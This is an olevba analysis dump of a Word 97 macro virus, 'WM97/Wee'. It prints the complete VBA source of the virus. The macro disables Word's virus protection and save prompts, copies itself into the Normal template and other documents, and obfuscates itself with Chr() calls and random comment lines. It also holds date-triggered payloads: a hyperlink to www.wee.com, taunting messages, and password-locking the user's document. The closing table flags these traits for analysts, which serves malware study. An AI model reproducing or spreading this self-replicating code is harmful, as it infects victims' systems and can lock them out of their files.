olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bi-7f348fc00253550b65e2e041d4a80f1bd473b61b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bi-7f348fc00253550b65e2e041d4a80f1bd473b61b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Randomize

o = 0: x = 0

On Error GoTo 75

Options.VirusProtection = Chr(48)

Options.SaveNormalPrompt = Chr(48)

Options.ConfirmConversions = Chr(48)

vx = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines

nt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines

If nt > 0 And vx > 0 Then GoTo 75

If nt = 0 Then

    Set Wee = NormalTemplate.VBProject.VBComponents

    Set host = ActiveDocument.VBProject.VBComponents

    If Month(Now()) = 12 And Day(Now()) = 23 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.wee.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(87) + Chr(69) + Chr(69)

    If Month(Now()) = 12 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

    If Month(Now()) = 12 And Day(Now()) = 25 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(87) + Chr(69) + Chr(69)

    If Month(Now()) = 12 And Day(Now()) = 26 Then Application.ActiveDocument.Password = "Wee"

    host.Item(Abs(1)).Name = Wee.Item(Abs(1)).Name

    host.Item(Abs(1)).Export Application.StartupPath & System.Version
    
End If

If vx = 0 Then Set Wee = ActiveDocument.VBProject.VBComponents

Wee.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version

With Wee.Item(Abs(1)).codemodule

    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)

    Next j

    End With

If nt = 0 Then Wee.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"

If nt = 0 Then Wee.Item(Abs(1)).codemodule.replaceline 81, "Sub ToolsMarco()"

If nt = 0 And vx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With Wee.Item(Abs(1)).codemodule

    For j = Chr(50) To Wee.Item(Abs(1)).codemodule.countoflines Step Chr(50)

    x = Int(Rnd(414835) * 403989) + 8485

    o = Int(Rnd(298368) * 235865) + 2988

    .replaceline j, Chr(39) & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o

Next j

End With

75:

If nt <> 0 And vx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode()

End Sub 'WM97/Wee by Virus ;)

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.wee.com  |URL                                          |
+----------+--------------------+---------------------------------------------+
